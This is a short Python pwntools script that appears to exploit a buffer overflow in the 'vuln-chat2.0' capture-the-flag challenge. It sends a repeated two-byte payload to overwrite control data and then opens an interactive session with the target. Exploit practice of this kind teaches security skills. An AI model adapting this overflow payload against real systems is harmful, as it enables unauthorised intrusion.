from pwn import *
import sys

if len(sys.argv) == 1:
	p = process("vuln-chat2.0")
else:
	p = remote("vulnchat2.tuctf.com", 4242)

print p.recv()
payload = "aaa"
p.sendline(payload)

print p.recv()

payload = "\x86\x72"*50
p.sendline(payload)

p.interactive()
